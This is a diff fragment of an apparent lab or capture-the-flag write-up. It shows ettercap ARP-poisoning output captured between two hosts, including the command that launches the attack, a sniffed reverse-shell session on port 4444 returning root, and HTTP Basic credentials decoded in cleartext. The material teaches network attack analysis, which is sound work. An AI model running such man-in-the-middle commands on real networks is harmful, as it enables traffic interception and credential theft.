@@ -1263,3 +1263,1269 @@ Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
 .
 OK
 
+Mon Feb  6 17:17:11 2023 [105138]
+TCP  192.168.12.10:47584 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:11 2023 [106039]
+TCP  192.168.12.10:47584 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:17:11 2023 [113126]
+TCP  192.168.12.20:80 --> 192.168.12.10:47584 | A (0)
+
+Mon Feb  6 17:17:11 2023 [942573]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (4)
+pwd
+
+Mon Feb  6 17:17:11 2023 [945003]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:11 2023 [945228]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:17:11 2023 [953105]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)
+
+Mon Feb  6 17:17:14 2023 [769305]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44092 | AP (3)
+ls
+
+Mon Feb  6 17:17:14 2023 [777002]
+TCP  192.168.12.20:44092 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:17:15 2023 [943649]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (3)
+ls
+
+Mon Feb  6 17:17:15 2023 [945002]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:15 2023 [950204]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:17:15 2023 [953066]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)
+
+Mon Feb  6 17:17:19 2023 [944789]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (7)
+whoami
+
+Mon Feb  6 17:17:19 2023 [954165]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:17:19 2023 [960960]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)
+
+Mon Feb  6 17:17:21 2023 [84418]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:17:21 2023 [89145]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | SA (0)
+
+Mon Feb  6 17:17:21 2023 [97075]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:21 2023 [107362]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (7)
+whoami
+
+Mon Feb  6 17:17:21 2023 [113067]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:21 2023 [114704]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:17:21 2023 [121135]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)
+
+Mon Feb  6 17:17:23 2023 [117738]
+TCP  192.168.12.10:47588 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:17:23 2023 [121057]
+TCP  192.168.12.20:80 --> 192.168.12.10:47588 | SA (0)
+
+Mon Feb  6 17:17:23 2023 [129031]
+TCP  192.168.12.10:47588 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:23 2023 [129437]
+TCP  192.168.12.10:47588 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:17:23 2023 [137107]
+TCP  192.168.12.20:80 --> 192.168.12.10:47588 | A (0)
+
+Mon Feb  6 17:17:23 2023 [139032]
+TCP  192.168.12.20:80 --> 192.168.12.10:47588 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:17:23 2023 [139252]
+TCP  192.168.12.20:80 --> 192.168.12.10:47588 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:17:23 2023 [145092]
+TCP  192.168.12.10:47588 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:23 2023 [146222]
+TCP  192.168.12.10:47588 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:17:23 2023 [153119]
+TCP  192.168.12.20:80 --> 192.168.12.10:47588 | A (0)
+
+Mon Feb  6 17:17:23 2023 [946091]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (4)
+pwd
+
+Mon Feb  6 17:17:23 2023 [953385]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:17:24 2023 [4806]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | A (0)
+
+Mon Feb  6 17:17:25 2023 [109381]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (4)
+pwd
+
+Mon Feb  6 17:17:25 2023 [112997]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:25 2023 [113204]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:17:25 2023 [121031]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)
+
+Mon Feb  6 17:17:27 2023 [947184]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44096 | AP (3)
+ls
+
+Mon Feb  6 17:17:27 2023 [952984]
+TCP  192.168.12.20:44096 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:17:29 2023 [110385]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (3)
+ls
+
+Mon Feb  6 17:17:29 2023 [112949]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:29 2023 [114214]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:17:29 2023 [121086]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)
+
+Mon Feb  6 17:17:33 2023 [119014]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (7)
+whoami
+
+Mon Feb  6 17:17:33 2023 [126465]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:17:33 2023 [133028]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)
+
+Mon Feb  6 17:17:34 2023 [361575]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:17:34 2023 [365029]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | SA (0)
+
+Mon Feb  6 17:17:34 2023 [372983]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:34 2023 [383186]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (7)
+whoami
+
+Mon Feb  6 17:17:34 2023 [393118]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:34 2023 [394556]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:17:34 2023 [401043]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)
+
+Mon Feb  6 17:17:35 2023 [179433]
+TCP  192.168.12.10:47592 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:17:35 2023 [181104]
+TCP  192.168.12.20:80 --> 192.168.12.10:47592 | SA (0)
+
+Mon Feb  6 17:17:35 2023 [188952]
+TCP  192.168.12.10:47592 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:35 2023 [189317]
+TCP  192.168.12.10:47592 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:17:35 2023 [197104]
+TCP  192.168.12.20:80 --> 192.168.12.10:47592 | A (0)
+
+Mon Feb  6 17:17:35 2023 [199050]
+TCP  192.168.12.20:80 --> 192.168.12.10:47592 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:17:35 2023 [199294]
+TCP  192.168.12.20:80 --> 192.168.12.10:47592 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:17:35 2023 [205072]
+TCP  192.168.12.10:47592 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:35 2023 [206314]
+TCP  192.168.12.10:47592 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:17:35 2023 [218665]
+TCP  192.168.12.20:80 --> 192.168.12.10:47592 | A (0)
+
+Mon Feb  6 17:17:37 2023 [120992]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (4)
+pwd
+
+Mon Feb  6 17:17:37 2023 [133796]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:17:37 2023 [184880]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | A (0)
+
+Mon Feb  6 17:17:38 2023 [385224]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (4)
+pwd
+
+Mon Feb  6 17:17:38 2023 [399721]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:38 2023 [399959]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:17:38 2023 [405020]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)
+
+Mon Feb  6 17:17:41 2023 [122073]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44100 | AP (3)
+ls
+
+Mon Feb  6 17:17:41 2023 [136263]
+TCP  192.168.12.20:44100 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:17:42 2023 [386260]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (3)
+ls
+
+Mon Feb  6 17:17:42 2023 [402732]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:17:42 2023 [404020]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | AP (30)
+rev.go
+root.txt
+server.sh
+www
+
+Mon Feb  6 17:17:42 2023 [426879]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)
+
+Mon Feb  6 17:17:46 2023 [418683]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (7)
+whoami
+
+Mon Feb  6 17:17:46 2023 [458963]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:17:46 2023 [540796]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | A (0)
+
+Mon Feb  6 17:17:47 2023 [343644]
+TCP  192.168.12.10:47594 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:17:47 2023 [381082]
+TCP  192.168.12.20:80 --> 192.168.12.10:47594 | SA (0)
+
+Mon Feb  6 17:17:47 2023 [421138]
+TCP  192.168.12.10:47594 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:47 2023 [421396]
+TCP  192.168.12.10:47594 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:17:47 2023 [453189]
+TCP  192.168.12.20:80 --> 192.168.12.10:47594 | A (0)
+
+Mon Feb  6 17:17:47 2023 [454756]
+TCP  192.168.12.20:80 --> 192.168.12.10:47594 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:17:47 2023 [454963]
+TCP  192.168.12.20:80 --> 192.168.12.10:47594 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:17:47 2023 [493339]
+TCP  192.168.12.10:47594 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:17:47 2023 [494332]
+TCP  192.168.12.10:47594 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:17:47 2023 [533528]
+TCP  192.168.12.20:80 --> 192.168.12.10:47594 | A (0)
+
+Mon Feb  6 17:17:50 2023 [452253]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44104 | AP (4)
+pwd
+
+Mon Feb  6 17:17:50 2023 [532236]
+TCP  192.168.12.20:44104 --> 192.168.12.10:4444 | R (0)
+Closing text interface...
+
+Terminating ettercap...
+Lua cleanup complete!
+ARP poisoner deactivated.
+RE-ARPing the victims...
+Unified sniffing was stopped.
+
+or 
+
+root@eve:~# ettercap -T -i eth1 -M arp > /tmp/arp.txt
+* |==================================================>| 100.00 %
+```
+```text
+┌──(kali㉿kali)-[~/learning_l2_mac]
+└─$ scp admin@10.10.148.6:/tmp/arp.txt .      
+admin@10.10.148.6's password: 
+arp.txt                               100%   13KB  21.9KB/s   00:00
+```
+```text
+┌──(kali㉿kali)-[~/learning_l2_mac]
+└─$ cat arp.txt                    
+
+ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team
+
+Listening on:
+  eth1 -> 0E:D9:C1:ED:A6:C1
+	  192.168.12.66/255.255.255.0
+	  fe80::8862:1aff:fee7:9471/64
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not set to 0.
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  57 ports monitored
+24609 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : ANY (all the hosts in the list)
+
+ GROUP 2 : ANY (all the hosts in the list)
+Starting Unified sniffing...
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+Mon Feb  6 17:18:51 2023 [779619]
+  192.168.12.10:0 --> 192.168.12.20:0 |  (0)
+
+Mon Feb  6 17:18:51 2023 [779684]
+  192.168.12.20:0 --> 192.168.12.10:0 |  (0)
+
+Mon Feb  6 17:18:53 2023 [18684]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | AP (3)
+ls
+
+Mon Feb  6 17:18:53 2023 [57916]
+TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:18:53 2023 [58400]
+TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:18:53 2023 [140800]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | A (0)
+
+Mon Feb  6 17:18:57 2023 [20237]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44126 | AP (7)
+whoami
+
+Mon Feb  6 17:18:57 2023 [57538]
+TCP  192.168.12.20:44126 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:18:59 2023 [616161]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:18:59 2023 [635151]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | SA (0)
+
+Mon Feb  6 17:18:59 2023 [647145]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:18:59 2023 [681825]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (7)
+whoami
+
+Mon Feb  6 17:18:59 2023 [719398]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:18:59 2023 [721525]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:18:59 2023 [747594]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)
+
+Mon Feb  6 17:19:00 2023 [466262]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:19:00 2023 [485205]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | SA (0)
+
+Mon Feb  6 17:19:00 2023 [497227]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:00 2023 [497388]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:19:00 2023 [509216]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | A (0)
+
+Mon Feb  6 17:19:00 2023 [510630]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:19:00 2023 [510878]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:19:00 2023 [533472]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:00 2023 [534450]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:19:00 2023 [573680]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:19:00 2023 [573744]
+TCP  192.168.12.20:80 --> 192.168.12.10:47618 | A (0)
+
+Mon Feb  6 17:19:00 2023 [585336]
+TCP  192.168.12.10:47618 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:03 2023 [683794]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (4)
+pwd
+
+Mon Feb  6 17:19:03 2023 [707343]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:03 2023 [707574]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:19:03 2023 [719390]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)
+
+Mon Feb  6 17:19:07 2023 [711817]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (3)
+ls
+
+Mon Feb  6 17:19:07 2023 [751803]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:07 2023 [752305]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:19:07 2023 [832819]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | A (0)
+
+Mon Feb  6 17:19:11 2023 [713275]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44130 | AP (7)
+whoami
+
+Mon Feb  6 17:19:11 2023 [746933]
+TCP  192.168.12.20:44130 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:19:12 2023 [667973]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:19:12 2023 [748419]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | SA (0)
+
+Mon Feb  6 17:19:12 2023 [788477]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:12 2023 [911722]
+TCP  192.168.12.10:47622 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:19:12 2023 [911751]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (7)
+whoami
+
+Mon Feb  6 17:19:12 2023 [950872]
+TCP  192.168.12.20:80 --> 192.168.12.10:47622 | SA (0)
+
+Mon Feb  6 17:19:12 2023 [950885]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:12 2023 [950891]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | AP (5)
+root
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:19:12 2023 [990026]
+TCP  192.168.12.10:47622 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:12 2023 [990038]
+TCP  192.168.12.10:47622 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+
+Mon Feb  6 17:19:12 2023 [990042]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)
+
+Mon Feb  6 17:19:13 2023 [31238]
+TCP  192.168.12.20:80 --> 192.168.12.10:47622 | A (0)
+
+Mon Feb  6 17:19:13 2023 [31251]
+TCP  192.168.12.20:80 --> 192.168.12.10:47622 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:19:13 2023 [31256]
+TCP  192.168.12.20:80 --> 192.168.12.10:47622 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:19:13 2023 [67233]
+TCP  192.168.12.10:47622 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:13 2023 [67246]
+TCP  192.168.12.10:47622 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:19:13 2023 [107501]
+TCP  192.168.12.20:80 --> 192.168.12.10:47622 | A (0)
+
+Mon Feb  6 17:19:16 2023 [912372]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (4)
+pwd
+
+Mon Feb  6 17:19:16 2023 [926740]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:16 2023 [926975]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:19:16 2023 [942831]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)
+
+Mon Feb  6 17:19:20 2023 [942395]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (3)
+ls
+
+Mon Feb  6 17:19:20 2023 [982344]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:20 2023 [982868]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:19:21 2023 [64892]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | A (0)
+
+Mon Feb  6 17:19:24 2023 [943550]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44134 | AP (7)
+whoami
+
+Mon Feb  6 17:19:24 2023 [981659]
+TCP  192.168.12.20:44134 --> 192.168.12.10:4444 | R (0)
+
+Mon Feb  6 17:19:25 2023 [261417]
+TCP  192.168.12.10:47628 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:19:25 2023 [298204]
+TCP  192.168.12.20:80 --> 192.168.12.10:47628 | SA (0)
+
+Mon Feb  6 17:19:25 2023 [338297]
+TCP  192.168.12.10:47628 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:25 2023 [338591]
+TCP  192.168.12.10:47628 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:19:25 2023 [378507]
+TCP  192.168.12.20:80 --> 192.168.12.10:47628 | A (0)
+
+Mon Feb  6 17:19:25 2023 [380976]
+TCP  192.168.12.20:80 --> 192.168.12.10:47628 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:19:25 2023 [381227]
+TCP  192.168.12.20:80 --> 192.168.12.10:47628 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:19:25 2023 [418650]
+TCP  192.168.12.10:47628 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:25 2023 [419635]
+TCP  192.168.12.10:47628 --> 192.168.12.20:80 | FA (0)
+
+Mon Feb  6 17:19:25 2023 [458620]
+TCP  192.168.12.20:80 --> 192.168.12.10:47628 | A (0)
+
+Mon Feb  6 17:19:26 2023 [180402]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | S (0)
+
+Mon Feb  6 17:19:26 2023 [195757]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | SA (0)
+
+Mon Feb  6 17:19:26 2023 [207576]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:26 2023 [237999]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (7)
+whoami
+
+Mon Feb  6 17:19:26 2023 [271909]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:26 2023 [273509]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | AP (5)
+root
+
+Mon Feb  6 17:19:26 2023 [300135]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)
+
+Mon Feb  6 17:19:30 2023 [239897]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (4)
+pwd
+
+Mon Feb  6 17:19:30 2023 [241004]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:30 2023 [241234]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | AP (6)
+/root
+
+Mon Feb  6 17:19:30 2023 [263329]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)
+
+Mon Feb  6 17:19:34 2023 [266461]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | AP (3)
+ls
+
+Mon Feb  6 17:19:34 2023 [306331]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | A (0)
+
+Mon Feb  6 17:19:34 2023 [306815]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:19:34 2023 [466432]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)
+
+Mon Feb  6 17:19:34 2023 [546758]
+TCP  192.168.12.20:44144 --> 192.168.12.10:4444 | FA (0)
+
+Mon Feb  6 17:19:34 2023 [586900]
+TCP  192.168.12.10:4444 --> 192.168.12.20:44144 | A (0)
+
+Mon Feb  6 17:19:37 2023 [662203]
+TCP  192.168.12.10:47634 --> 192.168.12.20:80 | S (0)
+
+Mon Feb  6 17:19:37 2023 [700543]
+TCP  192.168.12.20:80 --> 192.168.12.10:47634 | SA (0)
+
+Mon Feb  6 17:19:37 2023 [740561]
+TCP  192.168.12.10:47634 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:37 2023 [740736]
+TCP  192.168.12.10:47634 --> 192.168.12.20:80 | AP (133)
+GET /test.txt HTTP/1.1.
+Host: www.server.bob.
+Authorization: Basic YWRtaW46czNjcjN0X1A0eno=.
+User-Agent: curl/7.68.0.
+Accept: */*.
+.
+HTTP : 192.168.12.20:80 -> USER: admin  PASS: s3cr3t_P4zz  INFO: www.server.bob/test.txt
+
+Mon Feb  6 17:19:37 2023 [780674]
+TCP  192.168.12.20:80 --> 192.168.12.10:47634 | A (0)
+
+Mon Feb  6 17:19:37 2023 [782274]
+TCP  192.168.12.20:80 --> 192.168.12.10:47634 | AP (17)
+HTTP/1.0 200 OK.
+
+Mon Feb  6 17:19:37 2023 [782490]
+TCP  192.168.12.20:80 --> 192.168.12.10:47634 | FAP (171)
+Server: SimpleHTTP/0.6 Python/2.7.12.
+Content-type: text/plain.
+Content-Length: 3.
+Last-Modified: Sun, 27 Mar 2022 12:57:36 GMT.
+.
+OK
+
+Mon Feb  6 17:19:37 2023 [820844]
+TCP  192.168.12.10:47634 --> 192.168.12.20:80 | A (0)
+
+Mon Feb  6 17:19:37 2023 [821772]
+TCP  192.168.12.10:47634 --> 192.168.12.20:80 | FA (0)
+
